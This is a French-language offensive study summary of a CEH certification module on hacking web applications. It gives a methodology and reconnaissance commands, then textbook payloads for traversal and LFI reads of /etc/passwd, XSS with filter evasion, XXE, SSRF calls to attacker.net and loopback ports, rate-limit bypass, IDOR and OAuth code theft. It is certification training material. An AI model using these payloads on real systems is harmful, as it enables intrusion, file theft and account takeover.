# CEH M14 - Hacking Web Applications (synthese offensive)

Source: `CEHv13 - Module 14 - Hacking Web Applications hide01.ir.pdf` (368 pages), OCR complet
(pipeline_progress.log confirme PIPELINE_ALL_DONE). Theorie/countermeasures omises sauf quand
directement reutilisables offensivement (ex: bypass de rate-limit). Page = pagination du
module ("Module 14 Page NNNN"). Bruit OCR (watermark "hide01.ir") ignore. SQLi est traite dans
le module 15 separe, volontairement exclu d'ici.

## 1. Methodologie d'attaque (p.2017-2018)

Ordre suivi par le module, a respecter plutot que d'attaquer au hasard:
1. **Footprint web infrastructure** (recon passive/active)
2. **Analyze web applications** (cartographie des points d'entree)
3. **Bypass client-side controls**
4. **Attack authentication mechanism**
5. **Attack authorization schemes**
6. **Attack access controls**
7. **Attack session management mechanism**
8. **Perform injection attacks**
9. **Attack application logic flaws**
10. **Attack shared environments**
11. **Attack database connectivity**
12. **Attack web application clients**
13. **Attack web services**

### Footprinting concret (p.2019 ss)
- **Whois / DNS**: Netcraft, whois.domaintools.com, DNSRecon, dnsdumpster.com - cartographier
  IP/DNS avant tout scan actif.
- **Port/service discovery**: nmap classique (`nmap -T4 -A -v -PE -PA 21,22,80,3389 <cible>`).
- **Banner grabbing**: telnet/netcat sur le port web, ou Netcraft en passif.
- **Detection de proxy devant la cible**: envoyer une requete `TRACE` et lire les headers
  ajoutes par le proxy en retour (`Via:`, `X-Forwarded-For:`, `Proxy-Connection:`):
  ```
  TRACE / HTTP/1.1
  Host: www.test.com
  ```
  Si la reponse contient `Via: 1.1 192.168.11.15`, un proxy intermediaire est confirme.

### Analyse / enumeration de contenu (p.2019-2229)
```
gobuster dir -u <target URL> -w common.txt
gobuster dir -u <target URL> -w common.txt -s 200
gobuster dir -u http://www.moviescope.com -w /usr/share/wordlists/dirb/common.txt

dirb http://www.moviescope.com

nikto -h www.moviescope.com
```
Autres outils cites pour la decouverte/scan de contenu et de vulns web: **Burp Suite**,
**OWASP ZAP** (DAST), **WebScarab**, **Wappalyzer** (fingerprint stack), **WPScan** (sites
WordPress), **Vega**, **Arachni**, **Uniscan**, Nmap NSE `http-enum`. Pour l'analyse/scan
commercial plus poussee, le module cite aussi N-Stalker, Veracode, Invicti, Snyk, CodeSonar,
HCL AppScan (DAST/SAST automatises - utiles en recon large mais rarement suffisants seuls).

## 2. Injection & input validation

### Directory traversal (p.2048-2109)
```
http://www.certifiedhacker.com/process.aspx?page=../../../../some_dir/some_file
http://www.targetsite.com/../../../../etc/passwd
http://www.targetsite.com/../../../sitebackup.zip
```
Cible typique: fichiers hors du repertoire web (config, source, backups, `/etc/passwd`).

### LFI - Local File Inclusion (p.11098-11238)
```
http://xyz.com/page=../../../../../../etc/passwd
http://xyz.com/page=../../../../../../etc/passwd%00        # null byte: contourne une concat ".php" forcee cote serveur
http://xyz.com/index.php?page=php://filter/convert.base64-encode/resource=<fichier>
```
Piege signale par le module: si le code PHP force une extension (`$_GET['page'].".php"`), LFI
classique echoue car `etc/passwd.php` n'existe pas -> soit `%00` (PHP tres ancien) soit wrapper
`php://filter` pour lire le source en base64 sans l'executer. RFI mentionnee seulement via sa
contremesure (desactiver `allow_url_include`), peu de detail offensif direct dans ce module.

### Command injection (p.2463-2570, p.11163)
Injecter des caracteres shell (`;`, `&&`, `|`, backticks) dans un champ transmis a un appel
systeme cote serveur pour executer une commande OS en plus (ou a la place) de l'appel prevu.
Exemple de pattern SSI vulnerable cite (p.2804-2806):
```
<!--#exec cmd="cat /etc/passwd" -->
```

### XSS - Cross-Site Scripting (p.3107-3631)
Reflechi via lien/email (p.3208-3334):
```
<AHREF=http://bank.com/registration.cgi?clientprofile=<SCRIPT>maliciouscode</SCRIPT>>
```
Dans un champ de commentaire/blog (p.3422-3597):
```
<script>alert("Hello World")</script>
<script>onload=window.location='http://attacker.com'</script>
```
Payload demo du cheat sheet CEH:
```
http://certifiedhacker.com/<script>alert("WARNING: ...")</script>
```
**Evasion de filtre XSS (p.3609-3631)** - techniques citees:
- Encoder les caracteres en ASCII/HTML entities pour passer un filtre qui matche la string brute.
- Tab/espaces pour casser la detection de pattern: `<scr<script>ipt>document.write(...)`
  (tag imbrique qui laisse un tag valide une fois le tag interne retire par un filtre naif).
- Event handlers au lieu de `<script>`: `<img src="popup.jpg" onload=&#x...>` ou
  `<a href="&#6A;avascript:alert(document...)">` (javascript: encode en HTML entities).
- Exploitation via cookie-stealing (construire un lien qui exfiltre `document.cookie` vers un
  endpoint controle) et via DOM-based (`cache.open('attackerfile')...` - service worker cache
  poisoning cite p.3930) + XSS vers unauthorized request (CSRF-like via script injecte).

### CSRF (p.4361-4607)
"One-click attack": l'attaquant fait executer une requete d'etat (POST/GET) au navigateur de
la victime deja authentifiee sur le site cible, sans son consentement (souvent via `<img>`,
formulaire auto-submit cache, ou `<iframe>`). Tres utilise en chaine avec OAuth (voir section 4).

### XXE - XML External Entity (p.1988-1989, p.3959-3996)
XXE est en fait une forme de SSRF cote parseur XML mal configure. Payload exemple exact du
module:
```
POST http://certifiedhacker.com/xml HTTP/1.1

<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY bar SYSTEM "file:///etc/lsb-release">
]>
<foo>&bar;</foo>
```
Reponse: le contenu du fichier systeme est reflete dans la reponse HTTP. Peut aussi servir a
scanner le reseau interne, faire du DoS (billion laughs attack), voire du RCE dans certains
parseurs.

### Insecure Deserialization (p.4738-4865)
Injecter un objet serialise malveillant dans un flux que l'app deserialise sans validation -> le
code malveillant embarque dans l'objet s'execute silencieusement au moment de la deserialisation
(pas de detection par signature puisque ce n'est pas un payload "classique").

## 3. Authentification, session, autorisation

### Authentification (p.9190-9260, p.14614-15154)
- **Credential stuffing** (different du brute-force): rejouer des paires login/mdp deja fuitees
  sur un autre service, en automatisant massivement via botnet pour rester sous le seuil de
  rate-limit -> ne devine rien, exploite juste la reutilisation de mot de passe.
- **Bad passwords / brute-forcible login / verbose failure messages**: l'appli accepte des mdp
  faibles, ne limite pas les tentatives, et/ou indique precisement quel champ est faux (ex:
  "mauvais mot de passe" vs "compte inexistant") -> permet l'enumeration d'utilisateurs valides
  avant un bruteforce cible.
- **Bypass SAML-based SSO**: exploiter mauvaise verif de signature, expiration de session,
  replay, ou messages SAML mal routes.
- **Bypass MFA**: techniques generiques pour contourner le second facteur (non detaillees ici,
  a creuser au cas par cas - fatigue push, reuse de code, race condition sur verif OTP).

### Bypass de rate-limit (p.9987-10136) - offensif direct
```
# Burp Suite: modifier les headers IP pour simuler des sources differentes
X-Forwarded-For: <IP arbitraire>
```
Le module montre Burp Suite contournant un rate-limit en faisant varier le header
`X-Forwarded-For` (ou d'autres headers lus par l'app comme IP source) a chaque requete, donnant
l'impression que chaque tentative vient d'une IP differente.

### Session hijacking / fixation (p.4127-4129, p.9650-9692, p.11775-11835)
- **Session ID prediction/brute-forcing**: si l'ID de session suit un pattern previsible
  (ex: `Cookie: JSESSIONID=user01` - ID derive du username), le deviner/forcer directement.
- **Session fixation**: forcer la victime a utiliser un session ID connu de l'attaquant (lien
  avec `?sessionid=XXX` ou cookie pre-pose) avant qu'elle se logue -> une fois authentifiee,
  l'attaquant reutilise ce meme ID deja connu pour hijacker la session.
- Techniques generales de session hijacking (sniffing/MITM/replay) renvoyees vers le Module 11
  dedie - pas detaillees ici.

### Parameter tampering / cookie / HTTP pollution (p.1178-1301, p.9190-9226, p.10310-10406)
- **Hidden field manipulation**: modifier un champ de formulaire cache (ex: prix d'un article en
  e-commerce) via Burp Suite avant envoi -> `tools such as Burp Suite to trap the request ...
  modify the price field` (p.8518).
- **Cookie poisoning**: modifier le contenu d'un cookie pour usurper des infos utilisateur.
- **Cookie sniffing**: capturer le cookie de session en clair (reseau non chiffre/MITM) pour
  bypasser l'authentification.
- **Cookie replay**: rejouer un cookie de session capture tant que la session reste active cote
  serveur.
- **HTTP Parameter Pollution (HPP)**: envoyer le meme nom de parametre plusieurs fois dans une
  requete - les frameworks ne le traitent pas tous de la meme facon (premier/dernier/liste), ce
  qui permet de contourner des filtres de validation appliques sur une seule occurrence.

### Open redirect / unvalidated redirects (p.4085-4230)
```
# Header-based open redirect
https://site.com/redirect?url=http://attacker-controlled.com

# JavaScript-based open redirect
```
Utilise surtout en phishing (lien qui parait pointer vers le domaine legitime mais redirige
ensuite vers un site de credential-harvesting) ou pour exfiltrer un code OAuth (voir section 4).

## 4. Abus d'API / OAuth / IDOR

### IDOR via parameter pollution (p.15820-15886) - bypass concret
```
GET /profile?user_id=123&user_id=654 HTTP/1.1
```
Si l'app ne verifie l'autorisation que sur la premiere occurrence de `user_id` mais utilise la
deuxieme pour la requete reelle (ou l'inverse selon le framework), on bypass le controle
d'acces en dupliquant le parametre: un `user_id` legitime pour passer la verif, l'autre (celui
de la victime) pour la donnee reellement servie.

### Attaques OAuth (p.2183-2191)
- **Attack on 'Connect' request**: l'attaquant ouvre un faux compte chez le provider, initie un
  "Connect" avec le client mais bloque la redirection -> puis via une page malveillante en
  `<iframe>`, enchaine 3 CSRF: deconnecter la victime chez le provider, la reconnecter avec les
  creds du faux compte attaquant, puis faire valider la liaison "connect" -> le compte client de
  la victime se retrouve lie au faux compte provider de l'attaquant, qui peut alors s'y logger.
- **Attack on 'redirect_uri'**: trouver un XSS/leak sur une page du domaine client autorise comme
  `redirect_uri`, puis forcer la victime a ouvrir:
  ```
  https://provider.com/oauth/authorize?client_id=CLIENTID&response_type=auth_code&redirect_uri=https%3A%2F%2Fxyz.com%2Fvuln
  ```
  Le code d'autorisation atterrit sur la page vulnerable, qui l'exfiltre vers l'attaquant via le
  JS malveillant deja plante -> l'attaquant echange ensuite ce code contre un token via le vrai
  `redirect_uri`/callback.
- **CSRF on Authorization Response**: variante CSRF ciblant directement la 3e requete du
  flow authorization-code grant pour lier un faux compte provider au compte client victime.

### Autres abus API (p.9026-9220, p.14798-16096)
- **Rate limit bypass** (voir section 3, meme technique applicable aux endpoints API).
- **Credential stuffing contre API**: meme logique que web classique mais via appels API directs
  (souvent moins surveilles que le formulaire web).
- **BOLA (Broken Object Level Authorization)** = l'IDOR applique aux API (API1 OWASP API Top10).
- **API DDoS / botnet**: rester volontairement sous le seuil de rate-limit en distribuant les
  requetes sur de multiples sources pour epuiser les ressources serveur sans declencher de
  blocage.

## 5. SSRF, CSPP, CORS

### SSRF - types d'attaque (p.858-900, p.1749-1897)
```
# Injection basique dans un parametre qui accepte une URL/fichier
?url=http://127.0.0.1/admin
?url=http://127.0.0.1/phpmyadmin

# Acces fichiers via scheme file://
?url=file:///etc/passwd
?url=file://\/\/etc/passwd

# Acces services internes via scheme dedie
?url=ftp://attacker.net:11211/
?url=sftp://attacker.net:11111/
?url=tftp://attacker.net:123456/TESTUDP
?url=ldap://127.0.0.1/%0astats%0aquit

# XSPA - Cross-Site Port Attack: scanner les ports internes via loopback
?url=http://localhost:22/
?url=http://127.0.0.1:25/
?url=http://127.0.0.1:3389/
```
Piege/avantage: le serveur vulnerable sert de proxy vers son propre reseau interne (panels admin,
phpMyAdmin, metadata cloud non cite explicitement ici mais meme logique) - toujours tester les
ports classiques (21/22/25/3389) en XSPA avant de chercher plus loin.

### Connection String Parameter Pollution / Injection (p.11531-11680)
Si la chaine de connexion DB est construite par concatenation dynamique a partir d'un input
utilisateur, injecter un `;` pour ajouter/overrider un parametre:
```
Avant:  Data Source=Server,Port;Network Library=DBMSSOCN;Initial Catalog=DataBase;User ID=...;Password=...
Apres injection du mot de passe = "pwd;Encryption=off":
        ...;User ID=Username;Password=pwd;Encryption=off
```
Permet de desactiver le chiffrement de connexion, voler des creds, ou (Connection Pool DoS)
saturer le pool de connexions avec des requetes lourdes concurrentes pour faire echouer les
requetes legitimes.

### CORS misconfiguration (p.15763-15792)
```
POST /api/... HTTP/1.1
Content-Type: application/json
Origin: http://attackersite.com
```
Si le serveur reflete l'`Origin` recu dans `Access-Control-Allow-Origin` sans whitelist stricte
(et autorise les credentials), une page sur `attackersite.com` peut lire des donnees arbitraires
d'un utilisateur authentifie sur le site cible via une requete cross-origin.

## 6. Autres vecteurs cites (survol, p.3994-4085)

Liste des attaques listees dans la vue d'ensemble "Web Application Attacks" du module, en plus
de celles detaillees ci-dessus - a garder comme checklist de vecteurs a tester quand les
classiques echouent: Clickjacking, Watering Hole Attack, Cookie Snooping, RC4 NOMORE Attack,
JavaScript Hijacking, Cross-Site Web Socket Hijacking, Magecart Attack (JS skimmer injecte sur
page de paiement), Platform Exploits, Denial-of-Service (DoS), Obfuscation (bypass de WAF/filtre
via encodage multiple).

## Resume one-liner

Methodologie: footprint (whois/nmap/TRACE) -> enumerer contenu (gobuster/dirb/nikto/WPScan) ->
tester injection (LFI/command/XSS/XXE) -> attaquer auth/session (credential stuffing, rate-limit
bypass via X-Forwarded-For, session fixation) -> abuser autorisation (IDOR via parameter
pollution, CORS reflete, CSPP) -> si API/OAuth, chainer CSRF+redirect_uri pour voler le flow
d'autorisation. Burp Suite reste l'outil central pour intercepter/modifier chaque requete a
chaque etape.
